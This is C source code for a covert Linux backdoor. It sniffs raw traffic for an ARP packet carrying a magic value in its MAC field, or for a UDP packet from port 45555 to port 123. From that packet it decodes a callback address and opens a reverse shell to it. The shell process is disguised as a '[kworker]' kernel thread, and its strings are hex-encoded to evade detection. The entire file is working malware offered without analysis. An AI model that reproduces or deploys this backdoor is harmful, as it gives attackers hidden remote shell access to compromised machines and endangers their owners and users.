#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include<arpa/inet.h>
#include<linux/if_ether.h>
#include<linux/ip.h>
#include<linux/udp.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<sys/wait.h>
#include<sys/prctl.h>

#include<stdio.h>

// Define a custom struct to handle port/ip in UDP data
struct udp_data {
      //Callback Port
      unsigned char u_port[2];
      //Callback IP
      unsigned char  u_addr[4];
};

/* Define a custom struct to handle both the
   Ethernet Header and the Arp Header */
struct arp_hdr {
	//Ethernet header
	unsigned char  h_dest[6];     /*Destination MAC*/
	unsigned char  h_source[6];   /*Source MAC*/
	unsigned short h_proto;       /*Ether Type*/
	//ARP header
	unsigned short ar_hrd;        /*ARP Hardware Type*/
	unsigned short ar_pro;        /*ARP Protocol Type*/
	unsigned char  ar_hln;        /*ARP Hardware Length*/
	unsigned char  ar_pln;        /*ARP Proto Length*/
	unsigned short ar_op;         /*ARP OP Code*/

	unsigned char ar_sha[6];      /*ARP Sender Hardware Address*/
	unsigned char ar_sip[4];      /*ARP Sender Proto Address*/
	unsigned char ar_tha[6];      /*ARP Target Hardware Address*/
	unsigned char ar_tip[4];      /*ARP Target Proto Address*/
};

int reverse_shell(unsigned int, unsigned short);
int arp_listener();


/* Function to handle creating the Reverse
   Shell using the hidden data with the
   sender hardware address collected in main */

int reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
{

	if(fork()==0)
	{
		if (setsid()>0)
		{
			if(fork()==0)
			{
				if (setsid()>0)
				{

					struct sockaddr_in sa;
					int s;
                                
      					sa.sin_family = AF_INET;
      					sa.sin_addr.s_addr = IP_ADDR;
					sa.sin_port = PORT;
                                
					s = socket(AF_INET, SOCK_STREAM, 0);
      					connect(s, (struct sockaddr *)&sa, sizeof(sa));
      					dup2(s, 0);
      					dup2(s, 1);
      					dup2(s, 2);
                                
					/* shell = "sh"
   			 	 	   name  = "[kworker]"
	 	 			   execlp will search PATH looking for "sh" */
                                
					char shell[3] = {0x73,0x68,0x0};
					char name[10] = {0x5b,0x6b,0x77,0x6f,0x72,0x6b,0x65,0x72,0x5d,0x0};
					execlp(shell,name, (char *) NULL);
				}
				return 0;
			}
			return 0;
		}
	}
	wait(NULL);
	arp_listener();
}


/* Sniffs the wire for ARP packets and
   only triggers on a IEEE 1394 hw type */
int arp_listener()
{

	int sock_raw;

	unsigned char *buffer = (unsigned char *)malloc(1024);

	sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if(sock_raw < 0)
	{
		return 1;
	}
	while(1)
	{
		if(recv(sock_raw, buffer, 1024, 0) <0)
		{
			return 1;
		}

		// grab ethernet header to determine if ARP packet or IP packet
		struct ethhdr *ether = (struct ethhdr*)buffer;

		if ( ether->h_proto == ntohs(0x806)){

			struct arp_hdr *arphdr = (struct arp_hdr*)buffer;
			unsigned long first;
			unsigned long second;
			unsigned long trigger;
			
			// Split MAC field in half using bit shifting
			first=(arphdr->ar_tha[0]<<16); 
			first+=(arphdr->ar_tha[1]<<8); 
			first+=(arphdr->ar_tha[2]); 
			second=(arphdr->ar_tha[3]<<16); 
			second+=(arphdr->ar_tha[4]<<8); 
			second+=(arphdr->ar_tha[5]);
                        
			trigger = first + second;
                        
			// Calculated trigger value hidden within the target hardware addr field
			if(trigger == 0x1fffdfe) {
                        
				unsigned short port;
				unsigned int   ip;
                        
				// Bit shifting to build the return port/IP
				port=(arphdr->ar_sha[1]<<8) + (arphdr->ar_sha[0]);
				ip=(arphdr->ar_sha[5]<<24);
				ip+=(arphdr->ar_sha[4]<<16);
				ip+=(arphdr->ar_sha[3]<<8);
				ip+=(arphdr->ar_sha[2]);
                        
				close(sock_raw);
				reverse_shell(ip,port);
                        
			}
		}else if (ether->h_proto == htons(0x800)){

				//build ip/udp structs
				struct iphdr *ip = (struct iphdr*)(buffer + sizeof(struct ethhdr));
				unsigned short iphdr_len = ip->ihl*4;

				// Check if packet is a UDP packet
				if (ip->protocol == 17){

					struct udphdr *udp = (struct udphdr*)(buffer + iphdr_len + sizeof(struct ethhdr));

					// Trigger on udp src 45555 and udp dst 123
					if (udp->source == htons(45555) && udp->dest == htons(123)){

						struct udp_data *data = (struct udp_data*)(buffer + sizeof(struct udphdr) +iphdr_len + sizeof(struct ethhdr));
						/* used for debugging the sending of hidden data
						unsigned int temp = (data->u_port[1]<<8) + (data->u_port[0]);
						printf("Hidden Port: %d\n", temp);
						unsigned char a = data->u_addr[0];
						unsigned char b = data->u_addr[1];
						unsigned char c = data->u_addr[2];
						unsigned char d = data->u_addr[3];
						printf("Hidden IP: %d.%d.%d.%d\n", a,b,c,d);
						*/

						unsigned short port;
						unsigned int   ip;
                                
						// Bit shifting to build the return port/IP
						port=(data->u_port[1]<<8) + (data->u_port[0]);
						ip=(data->u_addr[3]<<24);
						ip+=(data->u_addr[2]<<16);
						ip+=(data->u_addr[1]<<8);
						ip+=(data->u_addr[0]);
                                
						close(sock_raw);
						reverse_shell(ip,port);
					}


				}
			}
			
	}

}

int main(int argc,char *argv[] )
{
	arp_listener();
	return 0;
}
